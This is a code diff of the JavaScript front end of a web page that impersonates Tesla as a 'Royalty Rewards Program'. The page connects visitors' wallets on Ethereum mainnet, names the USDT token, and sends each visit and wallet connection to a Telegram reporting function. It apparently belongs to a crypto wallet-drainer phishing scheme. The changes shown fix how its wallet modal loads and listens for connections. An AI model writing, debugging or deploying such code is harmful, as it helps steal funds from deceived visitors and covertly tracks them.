@@ -1,23 +1,22 @@
 // public/app.js
 
 // --- CONFIGURATION ---
-const APPKIT_PROJECT_ID = "862d3799047c7548b0482add1cba796d"; // <--- PASTE YOUR ID HERE
+const APPKIT_PROJECT_ID = "bbdfc9b65a1208cf2e642feeb2d4de92"; // Your Project ID
 const CONTRACT_ADDRESS = "0xYourDeployedContractAddress"; // Update this to your deployed contract
 const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; 
 const CHAIN_ID = 1; // Ethereum Mainnet
 const DOMAIN_NAME = "TeslaFlyingCar";
 const DOMAIN_VERSION = "1";
 
-// --- APPKIT INITIALIZATION ---
-// We use AppKit to handle the wallet connection modal seamlessly
-import { createAppKit } from '@reown/appkit';
-import { EthersAdapter } from '@reown/appkit-adapter-ethers';
-import { mainnet } from '@reown/appkit/networks';
+// Import AppKit directly from CDN
+import { createAppKit } from 'https://esm.sh/@reown/appkit';
+import { EthersAdapter } from 'https://esm.sh/@reown/appkit-adapter-ethers';
+import { mainnet } from 'https://esm.sh/@reown/appkit/networks';
 
 const metadata = {
   name: 'Tesla Flying Car',
   description: 'Official Royalty Rewards Program',
-  url: 'https://your-domain.com', // Replace with your actual domain
+  url: window.location.origin,
   icons: ['https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png']
 };
 
@@ -25,19 +24,24 @@ const networks = [mainnet];
 
 const adapter = new EthersAdapter();
 
-createAppKit({
-  adapters: [adapter],
-  networks,
-  projectId: APPKIT_PROJECT_ID,
-  metadata,
-  themeMode: 'dark', // Sleek black mode
-  themeVariables: {
-    '--w3m-color-mix': '#000000',
-    '--w3m-color-mix-strength': 0.5,
-    '--w3m-font-family': 'Inter, sans-serif',
-    '--w3m-border-radius-max': '12px',
-  },
-});
+try {
+    createAppKit({
+        adapters: [adapter],
+        networks,
+        projectId: APPKIT_PROJECT_ID,
+        metadata,
+        themeMode: 'dark',
+        themeVariables: {
+            '--w3m-color-mix': '#000000',
+            '--w3m-color-mix-strength': 0.5,
+            '--w3m-font-family': 'Inter, sans-serif',
+            '--w3m-border-radius-max': '12px',
+        },
+    });
+    console.log("AppKit Initialized Successfully");
+} catch (error) {
+    console.error("AppKit Init Failed:", error);
+}
 
 // --- TELEGRAM REPORTING ---
 async function notifyTelegram(action, details) {
@@ -73,18 +77,19 @@ document.addEventListener('DOMContentLoaded', async () => {
   notifyTelegram('VISIT', visitMessage);
 
   // 2. Listen for Wallet Connection via AppKit
-  const appKit = window.WalletConnectBridge?.appKit; // Accessing AppKit instance
-  
-  if (appKit) {
-    appKit.subscribeAccount((address) => {
-      if (address) {
-        handleWalletConnected(address);
+  // We wait for AppKit to be ready
+  setTimeout(() => {
+      const appKit = window.WalletConnectBridge?.appKit;
+      if (appKit) {
+          appKit.subscribeAccount((address) => {
+              if (address) {
+                  handleWalletConnected(address);
+              }
+          });
+      } else {
+          console.warn("AppKit instance not found yet");
       }
-    });
-  } else {
-    // Fallback if AppKit isn't ready immediately
-    console.log("Waiting for AppKit...");
-  }
+  }, 1000);
 });
 
 async function handleWalletConnected(userAddress) {
